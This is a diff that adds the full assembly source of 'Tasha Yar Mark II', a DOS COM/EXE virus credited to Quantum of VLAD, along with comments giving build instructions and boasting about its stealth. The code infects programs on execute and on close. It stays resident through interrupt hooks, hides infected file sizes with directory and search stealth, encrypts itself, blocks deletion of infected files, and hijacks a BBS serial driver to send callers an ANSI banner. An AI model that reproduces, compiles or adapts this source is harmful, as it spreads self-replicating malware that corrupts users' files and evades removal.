@@ -1,0 +1,1158 @@
+;
+; TASHA YAR - MARK II
+; by Quantum [VLAD]
+;
+; A Com/Exe Infector.. Infects on Execute and stream closes
+;
+; Utilises FULL stealth, dir stealth & search stealth.
+;  (and some petty other stealth tricks that aren't worth mentioning)
+;
+; uses a tbclean debugger trap, undetectable encryption & residency check
+;  all in 1.. (look at da code :)
+;
+; contains a (sorta) payload.......
+;
+; The fossil driver infector - aimed at BBS's int 14 is taken over and on
+;  detection of carrier an ANSI is sent out to the user (not the sysop :)
+;
+; The Homicide Prevention Squad - Fixes the "delete and forget" problem by
+;  making it impossible to "delete" an infected exe/com
+;
+; To those of you that gimme shit about size considerations.. if you can
+; find someone who notices that their fav exe/com suddenly gets bigger
+; (when they can't even see the size increase) and decides to delete it
+; (lotsa luck there buddy) then  ............
+; ------------------------------------------------------------------------
+;
+; A word of warning.. this is not a good virus to "test" .. wanna say good-bye
+; to your HDD ?  just make a few test exe's and com's like I did and try
+; infecting them.. hang on a tic.. what's dos doing ?  it's reloading
+; command.com from disk !  that's not good.. I'll just have a look to see if
+; command.com is infected.. nope.. wait a minute.. dir/search/full stealth
+; I know! .. I'll just use my trusty backup util/tape drive.. wait up..
+; attribute/datetime stealth..
+; oh shit.. now where'd I put that boot disk ?
+;
+; BTW - Compile with TASM /m2 .. Tlink to exe..
+
+DOSSEG
+.model small
+.stack
+.code
+
+hostcodestart:
+
+        mov ax,04c00h
+        int 21h
+
+hostcodeend:
+
+virusstart:
+
+        push es       
+
+        call recalc
+recalc: mov si,sp
+        mov bp,ss:[si]
+        sub bp,offset recalc
+
+        push es
+        push cs
+        push cs
+        pop ds
+        pop es
+
+        lea si,[bp+startenc]
+        lea di,[bp+startenc]
+        xor dx,dx
+        mov ax,1812h
+        int 21h
+        xor al,byte ptr [bp+encbyte]
+        xchg ah,al
+        call encdecrypt
+        jmp startenc
+
+encbyte: db 0h
+jumpsave: dd 0
+stacksave: dd 0
+
+encdecrypt:
+
+        mov cx,endenc-startenc
+encloop:lodsb
+        xor al,ah
+        stosb
+        loop encloop
+        ret
+
+startenc:
+
+        in al,40h
+        mov byte ptr [bp+encbyte],al
+
+        pop es
+
+        or dx,dx
+        jnz backtohost
+
+        mov ax,es
+        dec ax
+        mov ds,ax
+        cmp byte ptr ds:[0],"Z"
+        jnz backtohost
+
+        mov si,21h*4
+
+        sub word ptr ds:[3],(virusend-virusstart)/2   ; need room for buffer
+        sub word ptr ds:[12h],(virusend-virusstart)/2
+        mov ax,word ptr ds:[12h]
+        mov es,ax
+
+        xor ax,ax
+        mov ds,ax
+
+        push es
+        push cs
+        pop es
+        lea di,[bp+oldint21]
+        movsw
+        movsw
+        pop es
+
+        mov word ptr ds:[si-4],int21handler-virusstart
+        mov word ptr ds:[si-2],es
+
+        push ds
+
+        mov ah,4
+        xor dx,dx
+        int 14h
+
+        pop ds
+
+        cmp ax,1954h
+        jnz nofossil
+
+        push es
+        push cs
+        pop es
+        mov si,14h*4
+        lea di,[bp+oldint14off]
+        movsw
+        movsw
+        pop es
+
+        mov word ptr ds:[si-4],startint14-virusstart
+        mov word ptr ds:[si-2],es
+
+nofossil:
+
+        push cs
+        pop ds
+
+        lea si,[bp+virusstart]
+        xor di,di
+        mov cx,virusend-virusstart
+        rep movsb
+
+backtohost:
+
+        pop es
+
+        push cs
+        pop ds
+
+        cmp byte ptr [bp+comorexe],0
+        jnz comreturn
+
+        mov ax,es
+        add ax,10h
+        lea di,[bp+jumpsave+2]         ; return for exes
+        add [di],ax
+        cli
+        add ax,[di+4]
+        mov ss,ax
+        mov sp,[di+6]
+        sti
+        jmp $+2
+        jmp dword ptr cs:[bp+jumpsave]
+        comorexe: db 0
+
+comreturn:
+
+        push cs
+        pop es
+
+        lea si,[bp+virusstart-3]
+        mov di,0100h                       ; return for coms
+        push di
+        movsb
+        movsw
+        ret
+
+db "[Tasha Yar] by Quantum / VLAD"
+
+StartInt14:
+
+        mov cs:[cur_function-virusstart],ah
+        mov cs:[cur_port-virusstart],dx
+
+        pushf
+        db 09ah                                       ; fossil driver payload
+        oldint14off dw 0
+        oldint14seg dw 0
+
+        cmp byte ptr cs:[cur_function-virusstart],03h
+        jz checkDCD
+
+        iret
+
+checkDCD:
+        push ax
+        and al,10000000b
+        cmp al,cs:[dcdstat-virusstart]
+        jz nochange
+        mov cs:[dcdstat-virusstart],al
+        or al,al
+        jz nochange
+        call outtext
+nochange:
+        pop ax
+
+        iret
+
+outtext:
+
+        push ax
+        push bx
+        push cx
+        push dx
+        push es
+        push di
+
+        mov ah,19h
+        push cs
+        pop es
+        mov di,textblock-virusstart
+        mov cx,endblock-textblock
+        mov dx,cs:[cur_port-virusstart]
+        int 14h
+
+        pop di
+        pop es
+        pop dx
+        pop cx
+        pop bx
+        pop ax
+
+        ret
+
+cur_port: dw 0
+cur_function: db 0
+dcdstat: db 0
+
+EndInt14:
+
+
+int21handler:
+
+        cmp ax,1812h
+        jnz notserv
+        xor al,al
+        mov dx,4310h
+        iret
+notserv:
+
+        cmp ah,4bh
+        jz executing
+        cmp ah,6ch
+        jz xtendopening
+        cmp ah,3dh
+        jz opening
+        cmp ah,11h
+        jz diring
+        cmp ah,12h
+        jz diring
+        cmp ah,4eh
+        jz searching
+        cmp ah,4fh
+        jz searching
+        cmp ah,3eh
+        jz closing
+        cmp ah,13h
+        jnz playoldint
+        jmp deleteing
+
+playoldint:
+
+        db 0eah
+        oldint21 dd 0
+
+executing:
+
+        call pushall
+
+        call isitexe
+        jnz notexe
+        call infectexe
+        jmp aftexec
+notexe:
+        call isitcom
+        jnz aftexec
+        call infectcom
+aftexec:
+        call popall
+
+        jmp playoldint
+
+diring:
+
+        call callit
+        pushf
+        call pushall
+
+        call dirstealth
+
+        call popall
+        popf
+        retf 2
+
+searching:
+
+        call callit
+        pushf
+        call pushall
+
+        call searchstealth
+
+        call popall
+        popf
+        retf 2
+
+
+xtendopening:
+
+        call pushall
+
+        mov ax,03d02h
+        mov dx,si
+        call callit
+
+        pushf
+
+        xchg bx,ax
+
+        mov ah,3eh
+        call callit
+
+        popf
+
+        jc notfukable
+
+        jmp opennotpush
+
+notfukable:
+
+        call popall
+
+        jmp playoldint
+
+opening:
+
+        call pushall
+
+opennotpush:
+
+        call isitexe
+        jnz notexe1
+        call disinfectexe
+        jmp notcom1
+notexe1:
+        call isitcom
+        jnz notcom1
+        call disinfectcom
+notcom1:
+
+        call popall
+
+        jmp playoldint
+
+closing:
+
+        call pushall
+
+        cmp bx,5        ; so sue me..
+        jb notexe2
+
+        push bx
+        mov ax,1220h
+        int 2fh
+
+        xor bx,bx
+        mov bl,es:[di]
+
+        mov ax,1216h
+        int 2fh
+        pop bx
+
+        push es
+        pop ds
+
+        cmp byte ptr [di+2ah],"M"
+        jnz notcom2
+        mov word ptr [di+2h],02h
+        call infectcomonclose
+
+        jmp aftreinfect
+notcom2:
+        cmp byte ptr [di+2ah],"E"
+        jnz notexe2
+        mov word ptr [di+2h],02h
+        call infectexeonclose
+
+aftreinfect:
+
+        call popall
+
+        retf 2
+
+notexe2:
+
+        call popall
+
+        jmp playoldint
+
+deleteing:         ; HPS
+
+        call pushall
+
+        mov si,dx
+
+        cmp byte ptr [si],0ffh
+        jnz notxtended1
+        add si,7
+notxtended1:
+
+        inc si
+        push cs
+        pop es
+        mov di,offset filename-virusstart
+        movsw
+        movsw
+        movsw
+        movsw
+        mov al,"."
+        stosb
+        movsw
+        movsb
+        xor ax,ax
+        stosb
+
+        push cs
+        pop ds
+
+        mov ah,2fh
+        call callit
+
+        push es
+        push bx
+
+        mov dx,offset dta - virusstart
+        mov ah,1ah
+        call callit
+
+        mov ah,04eh
+        xor cx,cx                                ; allow for wild cards..
+        mov dx,offset filename - virusstart      ; ends up not deleting
+        int 21h                                  ; any file specified if
+        jc notinfected                           ; it has the tag even if
+                                                 ; it isnt a com/exe and
+checkfile:                                       ; bombs out as soon as it
+                                                 ; finds one..
+        mov ax,03d00h
+        mov dx,offset dta - virusstart +1eh
+        call callit
+
+        xchg bx,ax
+
+        mov ax,04202h
+        xor cx,cx
+        xor dx,dx
+        int 21h
+
+        sub ax,2
+        sbb dx,0
+        mov cx,dx
+        mov dx,ax
+        mov ax,04200h
+        call callit
+
+        mov ah,3fh
+        mov cx,2
+        mov dx,offset buffer - virusstart
+        call callit
+
+        mov ah,3eh
+        call callit
+
+        cmp word ptr ds:[offset buffer-virusstart],"@!"
+        jz itsinfected
+
+        mov ah,04fh
+        mov dx,offset filename - virusstart
+        call callit
+        jnc checkfile
+
+notinfected:
+
+        pop dx
+        pop ds
+
+        mov ah,1ah
+        call callit
+
+        call popall
+
+        jmp playoldint
+
+itsinfected:
+
+        pop dx
+        pop ds
+
+        mov ah,1ah
+        call callit
+
+        call popall
+
+        clc
+        xor ax,ax
+        retf 2
+
+; some useful functions
+
+callit:
+        pushf
+        call dword ptr cs:[oldint21-virusstart]
+        ret
+
+pushall:
+        pop word ptr cs:[save-virusstart]
+        push ax
+        push bx
+        push cx
+        push dx
+        push si
+        push di
+        push bp
+        push ds
+        push es
+        push word ptr cs:[save-virusstart]
+        ret
+save: dw 0
+
+popall:
+        pop word ptr cs:[save-virusstart]
+        pop es
+        pop ds
+        pop bp
+        pop di
+        pop si
+        pop dx
+        pop cx
+        pop bx
+        pop ax
+        push word ptr cs:[save-virusstart]
+        ret
+
+lseeks: xor ax,ax
+        jmp lseek
+lseeke: mov al,02h
+lseek:
+        mov ah,042h
+        xor cx,cx
+        xor dx,dx
+        call callit
+        ret
+
+isitexe:
+        
+        mov si,dx
+findend1: lodsb
+        or al,al
+        jnz findend1
+
+        cmp byte ptr ds:[si-2],"E"
+        jz kewl1
+        cmp byte ptr ds:[si-2],"e"
+kewl1:
+
+        ret
+
+isitcom:
+
+        mov si,dx
+findend2: lodsb
+        or al,al
+        jnz findend2
+
+        cmp byte ptr ds:[si-2],"M"
+        jz kewl2
+        cmp byte ptr ds:[si-2],"m"
+kewl2:
+
+        ret
+
+isitinfected:
+
+        call lseeke
+
+        sub ax,2
+        sbb dx,0
+        mov cx,dx
+        mov dx,ax
+        mov ax,04200h
+        call callit
+
+        mov ah,3fh
+        mov cx,2
+        mov dx,buffer-virusstart
+        call callit
+
+        cmp word ptr ds:[buffer-virusstart],"@!"
+        ret
+
+; low level call structures..
+
+dirstealth:
+
+        mov ah,2fh
+        call callit
+
+        push es
+        pop ds
+
+        cmp byte ptr [bx],0ffh
+        jnz notxtended
+        add bx,7
+notxtended:
+
+        xor bp,bp
+        cmp word ptr ds:[bx+0ah],"EX"
+        jz openher1
+        cmp word ptr ds:[bx+0ah],"MO"
+        jnz nogo1
+        mov bp,3
+openher1:
+
+        mov si,bx
+
+        push si
+        push es
+        push cs
+        pop es
+        mov di,filename-virusstart
+        inc si
+        movsw
+        movsw
+        movsw
+        movsw
+        mov al,"."
+        stosb
+        movsw
+        movsb
+        mov al,0
+        stosb
+        mov dx,filename-virusstart
+        pop es
+        pop si
+
+        push cs
+        pop ds
+
+        mov ax,03d00h
+        call callit
+
+        xchg ax,bx
+
+        call isitinfected
+        jnz tiskewl1
+
+        add bp,virusend-virusstart
+        sub word ptr es:[si+1dh],bp
+        sbb word ptr es:[si+1dh+2],0
+
+tiskewl1:
+
+        mov ah,3eh
+        call callit
+
+nogo1:
+
+        ret
+
+searchstealth:
+
+
+        mov ah,2fh
+        call callit
+
+        push es
+        pop ds
+
+        xor bp,bp
+        mov dx,bx
+        add dx,1eh
+        call isitexe
+        jz openher2
+        call isitcom
+        jnz nogo2
+        mov bp,3
+openher2:
+
+        xchg bx,si
+
+        mov ax,03d00h
+        call callit
+
+        push cs
+        pop ds
+
+        xchg ax,bx
+
+        push si
+        call isitinfected
+        pop si
+        jnz tiskewl2
+
+        add bp,virusend-virusstart
+        sub word ptr es:[si+1ah],bp
+        sbb word ptr es:[si+1ah+2],0
+
+tiskewl2:
+
+        mov ah,3eh
+        call callit
+
+nogo2:
+
+        ret
+
+disinfectcom:
+
+        mov ax,4301h
+        xor cx,cx
+        call callit
+
+        mov ax,03d02h
+        call callit
+
+        xchg bx,ax
+
+        mov ax,05700h
+        call callit
+
+        push cx
+        push dx
+
+        call isitinfected
+        jnz closeandgo
+
+        call lseeke
+
+        sub ax,virusend-virusstart+3
+        sbb dx,0
+        mov cx,dx
+        mov dx,ax
+        mov ax,04200h
+        call callit
+
+        push cs
+        pop ds
+
+        mov ah,03fh
+        mov cx,3
+        mov dx,buffer - virusstart
+        call callit
+
+        call lseeks
+
+        mov cx,3
+        mov dx,buffer - virusstart
+        mov ah,40h
+        call callit
+
+        call lseeke
+
+        sub ax,virusend-virusstart+3
+        sbb dx,0
+        mov cx,dx
+        mov dx,ax
+        mov ax,04200h
+        call callit
+
+        xor cx,cx
+        mov ah,40h
+        call callit
+
+closeandgo:
+
+        pop dx
+        pop cx
+
+        mov ax,5701h
+        call callit
+
+        mov ah,03eh
+        call callit
+
+        ret
+
+disinfectexe:
+
+        mov ax,4301h
+        xor cx,cx
+        call callit
+
+        mov ax,03d02h
+        call callit
+
+        xchg bx,ax
+
+        mov ax,05700h
+        call callit
+
+        push cx
+        push dx
+
+        call isitinfected
+        jnz itsnotinfected
+
+        call lseeke
+
+        sub ax,jumpsave-virusend
+        sbb dx,0
+        mov cx,dx
+        mov dx,ax
+        mov ax,04200h
+        call callit
+
+        mov ah,3fh
+        mov cx,8
+        mov dx,buffer-virusstart
+        call callit
+
+        mov ax,04200h
+        xor cx,cx
+        mov dx,14h
+        call callit
+
+        mov cx,4
+        mov dx,buffer-virusstart
+        mov ah,40h
+        call callit
+
+        mov ax,04200h
+        xor cx,cx
+        mov dx,0eh
+        call callit
+
+        mov cx,4
+        mov dx,buffer-virusstart + 4
+        mov ah,040h
+        call callit
+
+        call lseeke
+
+        sub ax,virusend-virusstart + 3
+        sbb dx,0
+        mov cx,dx
+        mov dx,ax
+        mov ax,04200h
+        call callit
+
+        xor cx,cx
+        mov ah,40h
+        call callit
+
+itsnotinfected:
+
+        pop dx
+        pop cx
+        mov ax,05701h
+        call callit
+
+        mov ah,03eh
+        call callit
+
+itsnotanexe:
+
+        ret
+
+infectexe:
+
+        mov ax,4301h
+        xor cx,cx
+        call callit
+          
+        mov ax,03d02h
+        call callit
+
+        xchg bx,ax
+
+infectexeonclose:
+
+        mov ax,05700h
+        call callit
+
+        push cx
+        push dx
+
+        push cs
+        push cs
+        pop es
+        pop ds
+
+        mov ah,03fh
+        mov cx,18h
+        mov si,(exeheader-virusstart)
+        mov dx,si
+        call callit
+
+        mov di,(jumpsave-virusstart)
+
+        mov ax,[si+14h]
+        stosw
+        mov ax,[si+16h]
+        stosw
+        mov ax,[si+0eh]
+        stosw
+        mov ax,[si+10h]
+        stosw
+
+        call lseeke
+
+        mov cx,16
+        DIV cx
+
+        add dx,20h
+        dec ax
+        dec ax
+        jc closefile
+
+        sub ax,[si+08h]
+        mov [si+14h],dx
+        mov [si+16h],ax
+
+        call isitinfected
+        jz closefile
+
+        mov byte ptr ds:[comorexe-virusstart],0
+
+        push ds
+
+        push cs
+        push cs
+        pop ds
+        pop es
+        push si
+
+        mov ah,40h
+        mov cx,startenc-virusstart
+        xor dx,dx
+        call callit
+
+        mov si,startenc-virusstart
+        mov di,virusend-virusstart
+        push di
+        mov ah, byte ptr ds:[encbyte-virusstart]
+        call encdecrypt
+
+        mov ah,040h
+        mov cx,endenc-startenc
+        pop dx
+        call callit
+
+        mov ah,40h
+        mov cx,virusend-endenc
+        mov dx,endenc-virusstart
+        call callit
+
+        pop si
+        pop ds
+
+        call lseeke
+
+        mov cx,512
+        DIV cx
+        inc ax
+
+        mov [si+2],dx
+        mov [si+4],ax
+        mov [si+0eh],ax
+        mov [si+10h],0400h
+
+        call lseeks
+
+        mov cx,18h
+        mov dx,si
+        mov ah,40h
+        call callit
+
+closefile:
+
+        pop dx
+        pop cx
+
+        mov ax,05701h
+        call callit
+
+        mov ah,03eh
+        call callit
+
+        ret
+
+infectcom:
+
+        mov ax,4301h
+        xor cx,cx
+        call callit
+
+        mov ax,03d02h
+        call callit
+
+        xchg bx,ax
+
+infectcomonclose:
+
+        mov ax,05700h
+        call callit
+
+        push cx
+        push dx
+
+        call isitinfected
+        jz closecomfile
+
+        call lseeks
+
+        push cs
+        pop ds
+
+        mov ah,3fh
+        mov cx,3
+        mov dx,(buffer-virusstart)
+        call callit
+
+        call lseeke
+
+        mov byte ptr ds:[buffer-virusstart+4],0e9h
+        mov word ptr ds:[buffer-virusstart+5],ax
+
+        call lseeks
+
+        mov ah,040h
+        mov cx,3
+        mov dx,(buffer-virusstart+4)
+        call callit
+
+        call lseeke
+
+        mov ah,40h
+        mov cx,3
+        mov dx,(buffer-virusstart)
+        call callit
+
+        mov byte ptr ds:[comorexe-virusstart],1
+
+        mov ah,40h
+        mov cx,startenc-virusstart
+        xor dx,dx
+        call callit
+
+        push cs
+        push cs
+        pop ds
+        pop es
+
+        mov si,startenc-virusstart
+        mov di,virusend-virusstart
+        push di
+        mov ah,byte ptr ds:[encbyte-virusstart]
+        call encdecrypt
+
+        mov ah,040h
+        mov cx,endenc-startenc
+        pop dx
+        call callit
+
+        mov ah,40h
+        mov cx,virusend-endenc
+        mov dx,endenc-virusstart
+        call callit
+
+closecomfile:
+
+        pop dx
+        pop cx
+
+        mov ax,05701h
+        call callit
+
+        mov ah,03eh
+        call callit
+
+        ret
+
+buffer: db 0,0,0
+filename:
+exeheader: db 18h dup (0)
+
+textblock:         ; the ansi
+db 0, 27, 91, 63, 55, 104, 27, 91, 52, 48, 109
+db 109, 27, 91, 50, 74, 27, 91, 53, 67, 27, 91
+db 91, 48, 59, 49, 109, 219, 219, 219, 219, 219, 219
+db 219, 219, 32, 220, 219, 219, 219, 219, 219, 220, 32
+db 32, 220, 219, 219, 219, 219, 219, 220, 32, 219, 219
+db 219, 32, 32, 32, 219, 219, 32, 220, 219, 219, 219
+db 219, 219, 219, 220, 27, 91, 54, 67, 219, 219, 32
+db 32, 32, 32, 219, 219, 32, 220, 219, 219, 219, 219
+db 219, 219, 220, 32, 219, 219, 219, 219, 219, 219, 220
+db 220, 13, 10, 27, 91, 55, 67, 222, 219, 221, 32
+db 32, 32, 32, 219, 219, 220, 220, 220, 219, 219, 32
+db 32, 219, 219, 220, 220, 220, 220, 32, 32, 219, 219
+db 219, 220, 220, 220, 219, 219, 32, 219, 219, 220, 220
+db 220, 220, 219, 219, 27, 91, 54, 67, 219, 219, 220
+db 220, 32, 220, 219, 219, 32, 219, 219, 220, 220, 220
+db 220, 219, 219, 32, 219, 219, 32, 32, 32, 219, 219
+db 219, 13, 10, 27, 91, 55, 67, 222, 219, 221, 32
+db 32, 32, 32, 219, 219, 223, 223, 223, 219, 219, 32
+db 32, 32, 223, 223, 223, 223, 219, 219, 32, 219, 219
+db 219, 223, 223, 223, 219, 219, 32, 219, 219, 223, 223
+db 223, 223, 219, 219, 27, 91, 55, 67, 223, 219, 219
+db 219, 219, 223, 32, 32, 219, 219, 223, 223, 223, 219
+db 219, 219, 32, 219, 219, 219, 219, 219, 219, 13, 10
+db 10, 27, 91, 55, 67, 222, 219, 221, 32, 32, 32
+db 32, 219, 219, 32, 32, 32, 219, 219, 32, 223, 219
+db 219, 219, 219, 219, 219, 223, 32, 219, 219, 32, 32
+db 32, 32, 219, 219, 32, 219, 219, 32, 32, 32, 219
+db 219, 219, 27, 91, 56, 67, 222, 219, 221, 32, 32
+db 32, 32, 219, 219, 32, 32, 32, 219, 219, 32, 219
+db 219, 219, 32, 32, 223, 219, 219, 13, 10, 27, 91
+db 91, 50, 54, 67, 80, 114, 111, 117, 100, 108, 121
+db 121, 32, 80, 114, 101, 115, 101, 110, 116, 101, 100
+db 100, 32, 98, 121, 32, 81, 117, 97, 110, 116, 117
+db 117, 109, 27, 91, 48, 109, 13, 10
+endblock:
+
+endenc:
+
+tag db "!@"
+dta:
+virusend:
+
+end virusstart
+
+
+
+
